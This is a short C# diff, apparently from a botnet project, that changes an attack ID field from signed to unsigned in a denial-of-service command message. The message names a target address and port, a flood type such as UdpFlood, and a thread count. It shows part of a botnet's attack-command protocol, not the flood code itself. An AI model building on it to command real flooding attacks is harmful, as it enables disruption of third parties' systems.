@@ -12,7 +12,7 @@ namespace Vinchuca.Network.Protocol.Messages.Command
             UdpFlood
         }
 
-        public long AttackId { get; set; }
+        public ulong AttackId { get; set; }
         public IPEndPoint Target { get; set; }
         public DosType Type { get; set; }
         public short Threads { get; set; }
@@ -31,7 +31,7 @@ namespace Vinchuca.Network.Protocol.Messages.Command
 
         public override void DecodePayload(BinaryReader br)
         {
-            AttackId = br.ReadInt64();
+            AttackId = br.ReadUInt64();
             Target = new IPEndPoint(new IPAddress(br.ReadBytes(4)), br.ReadInt16());
             Type = (DosType)br.ReadByte();
             Threads = br.ReadInt16();
